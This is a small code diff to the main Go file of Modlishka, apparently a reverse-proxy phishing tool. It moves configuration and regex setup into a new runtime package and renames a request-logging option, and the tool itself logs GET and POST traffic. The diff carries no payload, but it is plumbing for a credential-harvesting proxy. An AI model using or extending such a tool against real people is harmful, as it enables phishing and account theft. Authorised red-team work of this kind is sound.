@@ -19,6 +19,7 @@ import (
 	"github.com/drk1wi/Modlishka/core"
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/drk1wi/Modlishka/plugin"
+	"github.com/drk1wi/Modlishka/runtime"
 )
 
 type Configuration struct{ config.Options }
@@ -45,7 +46,8 @@ func (c *Configuration) initLogging() {
 	log.Options = log.LoggingOptions{
 		GET:      logGET,
 		POST:     *c.LogPostOnly,
-		FilePath: *c.LogFile,
+		LogRequestPath: *c.LogRequestFile,
+
 	}
 }
 
@@ -68,13 +70,14 @@ func main() {
 	conf.VerifyConfiguration()
 
 	// Set up runtime core config
-	core.SetCoreRuntimeConfig(conf.Options)
+	runtime.SetCoreRuntimeConfig(conf.Options)
 
 	// Set up runtime server config
 	core.SetServerRuntimeConfig(conf.Options)
 
+
 	// Set up regexp upfront
-	core.MakeRegexes()
+	runtime.MakeRegexes()
 
 	// go go go
 	core.RunServer()
